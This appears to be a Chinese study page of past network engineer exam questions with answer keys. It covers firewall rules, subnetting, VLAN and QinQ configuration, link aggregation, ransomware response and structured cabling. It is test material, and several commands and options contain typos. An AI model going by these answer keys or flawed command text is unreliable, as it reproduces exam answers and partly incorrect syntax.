src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520204551310.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在Linux系统通过（）命令，可以拒绝IP地址为192.168.0.2的远程主机登录到该服务器。</li></ol><p>A.iptables -A input -p tcp-s 192.168.0.2 -source-port 22 -j DENY<br>B.iptables -A input -p tcp-d 192.168.0.2 -source-port 22 -j DENY<br>C.iptables -A input -p tcp-s 192.168.0.2 -desination-port 22 -j DENY<br>D.iptables -A input -p tcp-d 192.168.0.2 -desination-port 22 -j DENY</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>数据包通过防火墙时，不能依据（）进行过滤。</li></ol><p>A.源和目的IP地址<br>B.源和目的端口<br>C.IP协议号<br>D.负载内容</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>为实现消息的不可否认性，A发送给B的消息需使用（）进行数据签名。</li></ol><p>A.A的公钥<br>B.A的私钥<br>C.B的公钥<br>D.B的私钥</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520204948545.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下关于AES加密算法的描述中，错误的是（）。</li></ol><p>A.AES的分组长度可以是256比特<br>B.AES的密钥长度可以是128比特<br>C.AES所用S盒的输入为8比特<br>D.AES是一种确定性的加密算法</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520205201417.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在对服务器的日志进行分析时，发现某一时间段，网络中有大量包含“USER”、“PASS”负载的数据，该异常行为最可能是（）。</li></ol><p>A.ICMP泛洪攻击<br>B.端口扫描<br>C.弱口怜扫描<br>D.TCP泛洪攻击</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在SNMPv3安全模块中的加密部分，为了防止报文内容的泄露，使用DES算法对数据进行加密，其密钥长度为（）。</li></ol><p>A.56<br>B.64<br>C.120<br>D.128</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520205451761.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>某主机无法上网，查看“本地连接”属性中数据发送情况，发现只有发送没有接收，造成该主机网络故障的原因最有可能是（）。</li></ol><p>A.IP地址配置错误<br>B.TCP&#x2F;IP协议故障<br>C.网络没有物理连接<br>D.DNS配置不正确</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>网络管理货用netstat命令监测系统当前的连接情况，若要显示所有80端口的网络连接，则应该执行的命令是（）。</li></ol><p>A.netstat -n -p | grep SYN REC lwc -l<br>B.netstat -anp | grep 80<br>C.netstat -anp | grep ‘tcp | udp’<br>D.netstat -plan | awk { ‘print$5’ }</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520205550894.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在Linux系统中，不能为网卡eth0添加IP: 192.168.0.2的命令是（）。</li></ol><p>A.ifconfig eth0 192.168.0.2 netmask 255.255.255.0 up<br>B.ifconfig eth0 192.168.0.2&#x2F;24 up<br>C.ipaddr add 192.168.0.2&#x2F;24 dev eth0<br>D.ipconfig eth0 192.168.0.2&#x2F;24 up</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>Windows系统想要接收并转发本地或远程SNMP代理产生的陷阱消息，则需要开启的服务是（）。</li></ol><p>A.SNMPServer服务<br>B.SNMPTrap服务<br>C.SNMPAgent服务<br>D.RPC服务</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>某公司的员工区域使用的IP地址段是172.16.132.0&#x2F;23，该地址段中最多能够容纳的主机数量是（）台。</li></ol><p>A.254<br>B.510<br>C.1022<br>D.2046</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><p>52~54. 某公司为多个部门划分了不同的局域网，每个局域网中的主机数量如下表所示，计划使用地址段192.168.10.0&#x2F;24划分子网，以满足公司每个局域网的IP地址需求，请为各部门选择最经济的地段或子网掩码长度。</p><p>A.24<br>B.25<br>C.26<br>D.27<br>A.192.168.10.0<br>B.192.168.10.144<br>C.192.168.10.160<br>D.192.168.10.70<br>A.30<br>B.29<br>C.28<br>D.27</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520210042898.png" alt="img"></p><blockquote><p>答：D,A,C</p></blockquote><ul><li><ol><li>某学校网络分为家属区和办公区，网管员将192.168.16.0&#x2F;24、192.168.18.0&#x2F;24两个IP地址段汇聚为192.168.16。0&#x2F;22用于家属区IP地址段，下面的IP地址中可用办公区IP地区的是（）。</li></ol><p>A.192.168.19.254&#x2F;22<br>B.192.168.17.220&#x2F;22<br>C.192.168.127.255&#x2F;22<br>D.192.168.20.11&#x2F;22</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>56.57. 在网络管理中，使用display port vlan 命令可查看交换机的（）信息，使用port link-type trunk命令修改交换机（）。</p><p>A.ICMP报文处理方式<br>B.接口状态<br>C.VLAN和Link Type<br>D.接口与IP对应关系<br>A.VLAN地址<br>B.交换机接口状态<br>C.接口类型<br>D.对ICMP报文处理方式</p></li></ul><blockquote><p>答：C,C</p></blockquote><ul><li><ol><li>下列命令片实现的功能是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520210908411.png" alt="img"></p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>.限制<span class="hljs-number">192.168.1.0</span>网段设备访问HTTP的流量不超过<span class="hljs-number">4</span>MbpsB.限制<span class="hljs-number">192.168.1.0</span>网段设备访问HTTP的流量不超过<span class="hljs-number">80</span>MbpsC.限制<span class="hljs-number">192.168.1.0</span>网段设备的TCP的流量不超过<span class="hljs-number">4</span>MbpsD.限制<span class="hljs-number">192.168.1.0</span>网段设备的TCP的流量不超过<span class="hljs-number">80</span>Mbps复制代码</code></pre><blockquote><p>答：A</p></blockquote><ul><li><ol><li>当网络中充斥着大量广播包时，可以采取（）措施解决问题。</li></ol><p>A.客户端通过DHCP获取IP地址<br>B.增加接入层交换机<br>C.创建VLAN来划分更小的广播域<br>D.网络结构修改为仅有核心层和接入层</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列命令片段含义是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520211108927.png" alt="img"></p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.关闭vlanif2接口<span class="hljs-selector-tag">B</span>.恢复接口上vlanif缺省配置C.开启vlanif2接口D.关闭所有vlanif接口复制代码</code></pre><blockquote><p>答：C</p></blockquote><ul><li><ol><li>要实现PC机切换IP地址后，可以访问不同的VLAN，需采用基于（）技术划分的VLAN。</li></ol><p>A.接口<br>B.子网<br>C.协议<br>D.策略</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520211144059.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><p>62.63. 在千兆以太网标准中，采用屏蔽双绞线作为传输介质的是（），使用长波1330nm光纤的是（）。</p><p>A.1000BASE-SX<br>B.1000BASE-LX<br>C.1000BASE-CX<br>D.1000BASE-T<br>A.1000BASE-SX<br>B.1000BASE-LX<br>C.1000BASE-CX<br>D.1000BASE-T</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520211252600.png" alt="img"></p><blockquote><p>答：C,B</p></blockquote><ul><li><ol><li>以太网的最大帧长为1518字节，每个数据帧前面有8个字节的签到字段，帧间隔为9.6μs，在100BASE-T网络中发送1帧需要的时间为（）。</li></ol><p>A.123μs<br>B.132μs<br>C.12.3ms<br>D.13.2ms</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520211459156.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>定级备案为等级保护第三级的信息系统，应当每（）对系统进行一个等级测评。</li></ol><p>A.半年<br>B.一年<br>C.两年<br>D.三年</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520211530165.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下措施中，不能加强信息系统身份认证安全的是（）。</li></ol><p>A.信息系统采用https访问 (传输过程)<br>B.双因子认证<br>C.设置登陆密码复杂性要求<br>D.设置登录密码有效期</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>（）存储方式常使用NFS协议为Linux操作系统提供文件共享服务。</li></ol><p>A.DAS<br>B.NAS<br>C.IP-SAN<br>D.FC-SAN</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520212030653.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在网络系统设计时，不可能使所有设计目标都能到达最优，下列措施中较为合理的是（）。</li></ol><p>A.尽量让最低建设成本目标达到最优<br>B.尽量让最短的故障时间目标达到最优<br>C.尽量让最大的安全性目标达到最优<br>D.尽量让优先级较高的目标达到最优</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520212150486.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在结构化布线系统设计时，配线间到工作区信息插座的双绞线最大不超过90米，信息插座到终端电脑网卡的双绞线最大不超过（）米。</li></ol><p>A.90<br>B.50<br>C.30<br>D.10</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520212242276.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列关于项目收尾的说法中错误的是（）。</li></ol><p>A.项目收尾应收到客户或买方的正式验收确认文件<br>B.项目收尾包括管理收尾和技术收尾 (管理和合同（验收）收尾)<br>C.项目收尾应向客户或买方交付最终产品、项目成果、精工文档等。<br>D.合同中止是项目收尾的一种特殊情况。</p></li></ul><blockquote><p>答：B</p></blockquote><h2 id="2020年11月"><a href="#2020年11月" class="headerlink" title="2020年11月"></a>2020年11月</h2><ul><li><ol><li>关系型数据库采用（）解决数据并发引起的冲突。</li></ol><p>A.锁机制<br>B.索引<br>C.分区表<br>D.读写分离</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520212440840.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>把模块按照系统设计说明书的要求组合起来进行测试，属于（）。</li></ol><p>A.单元测试<br>B.集成测试<br>C.确认测试<br>D.系统测试</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>虚拟存储体系由（）两级存储器构成。</li></ol><p>A.主存-辅存<br>B.寄存器-Cache<br>C.寄存器-主存<br>D.Cache-主存</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列操作系统中，不是基于Linux内核的是（）。</li></ol><p>A.AIX<br>B.Centos<br>C.红旗<br>D.中标麒麟</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520213008260.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>8086微处理器中执行单元负责指令的执行，它主要包括（）。</li></ol><p>A.ALU运算器、输入输出控制电路、状态寄存器<br>B.ALU运算器、通用寄存器、状态寄存器<br>C.通用寄存器、输入输出控制电路、状态寄存器<br>D.ALU运算器、输入输出控利电路、通用寄存器</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520213140169.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>使用白盒测试时，确定测试数据应根据（）指定覆盖准则。</li></ol><p>A.程序的内部逻辑<br>B.程序的复杂程度<br>C.使用说明书<br>D.程序的功能</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于RISC指令系统基本概念的描述中，错误的是（）。</li></ol><p>A.选取使用频率低的一些复杂指令，指令条数多。<br>B.指令长度固定<br>C.指令功能简单<br>D.指令运行速度快</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520213224470.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>计算机上采用的SSD（固态硬盘）实质上是（）存储器。</li></ol><p>A.Flash<br>B.磁盘<br>C.磁带<br>D.光盘</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520213331866.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>信息安全强调信息&#x2F;数据本身的安全属性，下面（）不属于信息安全的属性。</li></ol><p>A.信息的秘密性<br>B.信息的完整性<br>C.信息的可用性<br>D.信息的实时性</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>我国由（）主管全国软件著作权登记管理工作。</li></ol><p>A.国家版权局<br>B.国家新闻出版署<br>C.国家知识产权局<br>D.地方知识产权局</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><p>11.12. 8条模拟信道采用TDM复用成1条数字信道，TDM帧的结构为8字节加1比特同步开销（每条模拟信道占1个字节）。若模拟信号频率范围为10~16KHZ，样本率至少为（）样本&#x2F;秒，此时数据信道的数据速率为（）Mbps。</p><p>A.8k<br>B.10K<br>C.20K<br>D.32K<br>A.0.52<br>B.0.65<br>C.130<br>D.2.08</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520213732514.png" alt="img"></p><blockquote><p>答：D,D</p></blockquote><ul><li><p>13.14. 在异步传输中，每个字符包括1位起始位，7位数据位，2位停止位，1位校验位，每秒传输200字符，采用曼彻斯特编码，有效数据速率是（）kb&#x2F;s，最大波特率（）Baud。</p><p>A.1.2<br>B.1.4<br>C.2.2<br>D.2.4<br>A.700<br>B.2200<br>C.1400<br>D.4400</p></li></ul><blockquote><p>答：B，D</p></blockquote><ul><li><ol><li>在卫星通信中，通常采用的差错控制机制为（）。</li></ol><p>A.停等ARQ<br>B.后退N帧ARQ<br>C.选择重发ARQ<br>D.最大限额ARQ</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下千兆以太网标准中，支持1000m以上传输距离的是（）。</li></ol><p>A.1000BASE-T<br>B.1000BASE-CX<br>C.1000BASE-SX<br>D.1000BASE-LX</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520214016958.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>综合布线系统中，用于连接各层配线室，并连接主配室的子系统为（）。</li></ol><p>A.工作区子系统<br>B.水平子系统<br>C.垂直子系统<br>D.管理子系统</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520214113372.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>光纤传输测试指标中，回波损耗是指（）。</li></ol><p>A.信号反射引起的衰减<br>B.传输距离引起的发射端的能量与接收端的能量差 (链路损耗)<br>C.光信号通过活动连接器之后功率的减少 （插入损耗，IL）<br>D.传输数据时线对间信号的相互泄露 (串扰，铜线)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520214234045.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以100Mb&#x2F;s以太网连接的站点A和B相隔2000m，通过停等机制进行数据传输，传播速度为200m&#x2F;us，有效的传输速率为（）Mb&#x2F;s。</li></ol><p>A.80.9<br>B.82.9<br>C.90.1<br>D.92.3</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520214345964.png" alt="img"></p><p>1</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520214708630.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><p>20.21. 采用ADSL接入互联网，计算机需要通过（）和分离器连接到电话入户接线盒。在HFC网络中，用户通过（）接入CATV网络。</p><p>A.ADSL交换机<br>B.Cable Modem<br>C.ADSL Modem<br>D.无线路由器<br>A.ADSL交换机<br>B.Cable Modem (电视猫)<br>C.ADSL Modem<br>D.无线路由器</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520214755617.png" alt="img"></p><blockquote><p>答：C,B</p></blockquote><ul><li><ol><li>某IP网络连接如下图所示，下列说法中正确是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520214910806.png" alt="img"></p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.共有<span class="hljs-number">2</span>个冲突域<span class="hljs-selector-tag">B</span>.公有<span class="hljs-number">2</span>个广播域C.计算机S和计算机T构成冲突域D.计算机O查找计算机<span class="hljs-attribute">R</span>的MAC地址时，ARP报文会传播到计算机S复制代码</code></pre><blockquote><p>答：B</p></blockquote><ol><li><p>采电HDLC协议进行数据传输时，RNR5表明（）。</p><p>A.拒绝编号为5的帧<br>B.下一个接受的帧编号应为5，单接收器未准备好，暂停接收<br>C.后退N帧重传编号为5的帧<br>D.选择性拒绝编号为5的帧</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520215147136.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>若主机采用以太网接入Internet, TCP段格式中，数据字段最大长度为（）字节。</li></ol><p>A.20<br>B.1460<br>C.1500<br>D.65535</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250520215219626.png" alt="img"></p><blockquote><p>打：B</p></blockquote><hr><h1 id="下午历年真题"><a href="#下午历年真题" class="headerlink" title="下午历年真题"></a>下午历年真题</h1><h2 id="2024年11月-1"><a href="#2024年11月-1" class="headerlink" title="2024年11月"></a>2024年11月</h2><ul><li>试题一（15分）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426201008590.png" alt="图1"></p><p>图1</p><p>公司为某科技园区的不同企业提供网络服务，不同企业的业务有所不同，每个企业因业务需要在不同的地点有多个分支机构。其拓扑结构如图 1 所示。企业用户通过楼层接入交换机、楼栋汇聚交换机和区域交换机接入园区汇聚网络。</p><blockquote><p>问题1（3分，配置Access和Trunk）：如表1所示，交换机 H1 和 H2 是为企业用户提供服务的楼层接入交换机，交换机 P1 和 P2是楼栋汇聚交换机，交换机 C1 是区域交换机。各层交换机所配置 VLAN 如表 1 所示。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426195030556.png" alt="表1"></p><p>表1</p><blockquote><p>答: (1) 10 (2) trunk (3) allow-pass</p></blockquote><pre><code class="hljs shell">[H1] vlan batch 10 20 30[H1] interface GigabitEthernet 0/0/1[H1-GigabitEthernet0/0/1] port link-type access[H1-GigabitEthernet0/0/1] port default vlan 10 # (1)[H1-GigabitEthernet0/0/1] quit[H1] interface GigabitEthernet 0/0/4[H1-GigabitEthernet0/0/4] port link-type trunk # (2)[H1-GigabitEthernet0/0/4] port trunk allow-pass vlan 10 20 30 # (3)[H1-GigabitEthernet0/0/4] quitlanguage-shell复制代码</code></pre><blockquote><p>问题2（6分，配置QinQ）：在楼层接入交换机上，同一企业处在相同的VLAN中。公司为了节省VLAN资源，在楼栋汇聚交换机上采用QinQ技术，使得向相同企业的业务实现透传。</p></blockquote><blockquote><p>答: (4) enable (5) 100 (6) 30</p></blockquote><pre><code class="hljs bash">[P1] vlan batch 100 200[P1] interface GigabitEthernet 0/0/1[P1-GigabitEthernet0/0/1] port link-type trunk[P1-GigabitEthernet0/0/1] port trunk allow-pass vlan 100 200[P1-GigabitEthernet0/0/1] qinq vlan-translation <span class="hljs-built_in">enable</span> <span class="hljs-comment"># (4)</span>[P1-GigabitEthernet0/0/1] port vlan-stacking vlan 10 20 stack-vlan 100 <span class="hljs-comment"># (5) </span>[P1-GigabitEthernet0/0/1] port vlan-stacking vlan 30 stack-vlan 200 <span class="hljs-comment"># (6)</span>[P1-GigabitEthernet0/0/1] quit[P1]</code></pre><blockquote><p>问题3（6分，配置VLAN Mapping技术），在区域交换机上配置VLAN Mapping技术，使得相同企业的业务在不同层次中的VLAN可以互通。</p></blockquote><blockquote><p>答：(7) 10 to 20 (8) 200 (9) 300</p></blockquote><pre><code class="hljs bash">[C1] interface GigabitEthernet 0/0/1[C1-GagabitEthernet0/0/1] port vlan-mapping vlan 100 inner-vlan 10 to 20 map-vlan 300 <span class="hljs-comment"># (7)</span>[C1-GagabitEthernet0/0/1] port vlan-mapping vlan 200 inner-vlan 30 map-vlan 300 <span class="hljs-comment"># (8)(9)</span>[C1-GagabitEthernet0/0/1] quit[C1]</code></pre><ul><li>试题二（20分）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426200703342.png" alt="图2"></p><p>图2</p><p>某企业网络拓扑如图2所示，网络规划详见表2。所有业务网格均位于交换机Core上，有线终端、无线终端、无线AP均由DHCP服务器分配IP地址及网络参数。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426202010430.png" alt="表2"></p><p>表2</p><blockquote><p>问题1（4分,IP地址聚合和防火墙）：管理员在CORE上规划了ACL，需求如下：</p></blockquote><blockquote><ol><li>只允许无线、有线终端访问DNS服务器的DNS服务</li></ol></blockquote><blockquote><ol><li>静止无线用户访问设备管理、无线AP管理网络</li></ol></blockquote><p>请补充下表中的空缺项</p><blockquote><p>答：（1）10.10.2.0&#x2F;23 (2) permit (3) 10.10.0.0&#x2F;23 (4) deny</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426202317352.png" alt="img"></p><blockquote><p>问题2（8分，网络安全）：网络源发现某台主机感染了病毒，大部分的文件后缀都变成了.LOCK，桌面背景被篡改，提示“All you data has been locked, mail to <a href="mailto:&#120;&#x78;&#120;&#120;&#x40;&#108;&#x6f;&#x63;&#107;&#x2e;&#x78;&#x79;&#122;">xxxx@lock.xyz</a>”。该主机可能感染（）类型的病毒，网管员应该采取（）的措施（至少回答3点措施）。</p></blockquote><blockquote><p>答：</p></blockquote><pre><code class="hljs bash"><span class="hljs-comment"># (5) 勒索</span><span class="hljs-comment"># (6)</span>1. 立即断开网络、隔离受影响的系统：发现勒索病毒，应立即端口网络连接，隔离受影响的系统，防止病毒进一步扩散。2. 备份未受影响的数据，使用勒索病毒专用扫描工具清理。使用专业的防病毒软件和安全管理工具对受感染系统进行全面的病毒扫描和清理，尝试恢复被加密的数据。3. 加强安全防范措施：定期备份重要数据，以防数据丢失或损坏，及时更新并升级操作系统、浏览器和其他关键软件，确保它们包含最新的安全补丁。加强员工的安全防范意识。</code></pre><blockquote><p>问题3（8分,链路聚合扩容）：网络使用一段时间后，用户反馈互联网业务变慢，网络管理员发现NGFW和Core之间下行带宽长时间利用率100%，计划利用空闲的千兆端口，在NGFW和Core之间增加一条链路，实现链路带宽扩容以解决网络故障。</p></blockquote><p>网管员规划以下两种扩容技术方案：</p><p>方案一：原有链路不变，两台设备之间新增链路采用新的互联地址，通过配置静态路由形成（7）从而实现两条链路的流量负载分担。</p><p>方案二：采用链路聚合技术，将原有链路和新增捆绑在一起形成一条逻辑链路，实现链路带宽的提升。为防止接收端接收到的数据包乱序，可采用（8）负载机制，既能保证同一数据流在同一条物理链路上转发，又实现了各物理链路上的负载分担。</p><p>网络管理员选择方案二进行配置，防火墙的链路聚合配置如下：</p><pre><code class="hljs bash">[NGFW] interface eht-trunk 1[NGFW-Eth-Trunk1] trunkport GigabitEthernet 0/1[NGFW-Eth-Trunk1] trunkport GigabitEthernet 0/2[NGFW-Eth-Trunk1] load-balance src-dst mac[NGFW-Eth-Trunk1] port link-type <span class="hljs-built_in">link</span>[NGFW-Eth-Trunk1] port trunk allow-pass vlan 100</code></pre><p>交换机Core的链路聚合配置和防火墙相同，配置完成后，网管员发现网络体验未得到改善，查看物理链路、聚合链路状态均正常，单流量依然集中在原有的链路上，新增链路几乎无流量。请分析原因是（9），可采取（10）措施解决改故障。</p><blockquote><p>答：</p></blockquote><pre><code class="hljs bash"><span class="hljs-comment">#（7）等价路由</span><span class="hljs-comment">#（8）逐流</span><span class="hljs-comment">#（9）</span>    1. 链路接口物理连接错误。    2. 负载分担模式配置错误。<span class="hljs-comment">#（10）检查链路接口物理链接，更改负载分担模式为 load-balance src-dst ip</span></code></pre><ul><li>试题三（20分）</li></ul><p>某公司新建综合业务大楼，共9层，每层建有弱电间1个，4层建有机房。1<del>3层作为商场，计划部署无线接入，供入住商家和访客设置不同资源访问权限；4</del>9层为办公区域，通过部署有线接入，计划部署信息面板600个。</p><blockquote><p>问题1（6分）：请根据建设需求，补充完成以下结构化综合布线规划表。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426205447697.png" alt="结构化综合布线规划表"></p><p>结构化综合布线规划表</p><p>答：</p><pre><code class="hljs bash">（1）信息插座、楼层配线架至信息插座的水平线缆（双绞线或光纤）、配线架等（2）每层走廊天花板上（3）根据用户需求水平线缆可以采用五类线、超五类线非屏蔽双绞线，或者屏蔽双绞线，最大水平距离90m；也可以采用光纤。（4）网络设备（如交换机、路由器、服务器）、安全设备（如防火墙、IDS、IPS）和UPS等；（5）4层机房（6）位置和面积、温湿度环境要求、防火防尘防静电设计要求、物理安全性设计要求等。</code></pre><p>理论学习</p><pre><code class="hljs bash"><span class="hljs-comment"># 水平布线子系统：</span>    概述：        它的起点位置就是我们的设备管理间，我们每一层都有弱电间，这个弱电间一般来说我们会放一些交换机和程控设备；水平子系统一端起源弱电间，它一般是走天花板的，因为我们是新建的综合大楼，所以说会部署到天花板上，通过天花板把它覆盖住，在外边看不见的；另外一端会走到墙上的信息插座，通过线缆将两端连接。    组成部分：        1. 墙上的信息插座（起点）        2. 从信息插座到楼层的弱电间的水平线路，一般是光纤和双绞线        3. 在弱电间里面有配线架，通过这个配线架把线缆插入到交换机上    部署位置：因为是新建的综合性大楼，所以是通过(每一层的天花板)走到各个房间的信息插座上的。    设计要求：        1. 一般采用五类线/超五类线这种非屏蔽双胶线，如果对安全性/抗干扰性要求比较高可以采用屏蔽双绞线；        2. 要求距离小于等于90米，应该从墙上的信息插座到设备是5米，在弱电间还有5米的跳线；一共100米；        3. 也可以是光纤，如果是光纤就没有距离要求了。<span class="hljs-comment"># 设备间子系统</span>    概述：        就是我们通常所说的中心机房，就是我们垂直干线子系统把我们楼层的设备连接上后会接入到设备间子系统(中心机房)。    组成部分：        各种网络设备，比如说交换机、路由器、防火墙、服务器和UPS，这些辅助我们网络运行的设备都是放在设备间子系统中。    部署位置：        题目说4层建有机房，我们可以把设备间子系统部署到机房中；一般来说设备间子系统是处于楼的中间层次。    设计要求：        位置：放在4层        面积：有多少设备，每个设备占多少平方；        温度：        湿度：        防火：        防尘：        防静电：        物理安全：防盗门、监控设备。</code></pre><blockquote><p>问题2（6分）商场的无线系统采用AC+FIT AP模式（FIT是瘦AP，还有FAT AP是胖PA）时，请简述AC的主要配置内容。</p></blockquote><p>答：</p><pre><code class="hljs bash">1. 创建AC组：AC管理的多个AP需要进行通用的配置时，可以将AP加入到同一个AP组中，对AP组进行统一配置操作。2. 配置AP上线。    （1）配置AC为DHCP服务器：为AP和客户端设备分配IP地址；    （2）创建域管理模块：用于管理不同的网络域，确保网络的安全和隔离；    （3）配置AC的国家码：国家码用来标识AP射频所在的国家，规定了不同的发送功率、信道（中国是1~13信道，14信道没有用）等；    （4）绑定域管理模块到AP组：为AP组绑定特定的管理模块，确保配置一致性和安全性；    （5）配置AC的源接口：选择合适的源接口（如VLAN或LoopBack接口）与AP建立CAPWAP隧道；    （6）配置AP认证方式：设置AP的认证方式，有MAC地址认证和SN认证；    （7）CAPWAP链路配置：包括DTLS会话，加密套件，心跳检测等，确保AP与AC之间的安全通信。3. 配置STA（终端）上线：实现STA的正常接入。    （1）配置射频，包括信道（错开信道1和7）、发射功率等；    （2）配置VAP(多WIFI，访客WIFI),包括数据转发方式、业务VLAN、安全模块、流量模版等；    （3）下发配置。</code></pre><p>理论学习</p><pre><code class="hljs bash"><span class="hljs-comment"># FAT AP胖AP：设置很多单独的IP，每个AP可以独立管理，作为独立的接入点去设置，这样对于面积大的就不太合适，管理起来不方便；</span><span class="hljs-comment"># AC + FIT AP瘦AP: AP无线接入点只作为信号的接入点，不具有管理功能；AC负责管理，对所有AP统一配置和管理。</span></code></pre><blockquote><p>问题3（4分）请列举常用无线认证方式？商场打印机和访客分别采用什么认证方式较为合适？</p></blockquote><p>答：</p><pre><code class="hljs bash">1. 常用的无线认证方式包括802.1X认证、MAC认证、Portal认证等；2. 打印机采用MAC地址认证，访客采用Portal认证。</code></pre><p>理论学习：</p><pre><code class="hljs bash">802.1X：优点：安全性比较高；缺点：部署不灵活，需要安装客户端；MAC地址：Portal认证：人流量很多的地方，灵活。火车站/机场WIFI/码头，打开浏览器手机短信认证。</code></pre><blockquote><p>问题4（4分）当前配置的AP最大接入用户&lt;&#x3D;90，由于商场空间大，人流量大，计划通过缩小AP部署间隔、增加AP数量等方式，提升无线上网体验，请问该方式部署规划存在哪些缺点？应采用什么措施解决？</p></blockquote><p>答：缩小AP部署间隔、增加AP数量可能导致AP之间的无线信号产生干扰，通过调整AP功率来满足覆盖范围；优化相邻AP的信道，减少相互干扰；优化AP部署位置。</p><ul><li>试题四（20分）</li></ul><p>某公司网络拓扑如下图所示，路由器R1,R2,R3,R4运行OSPF协议。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426214653392.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250426214707392.png" 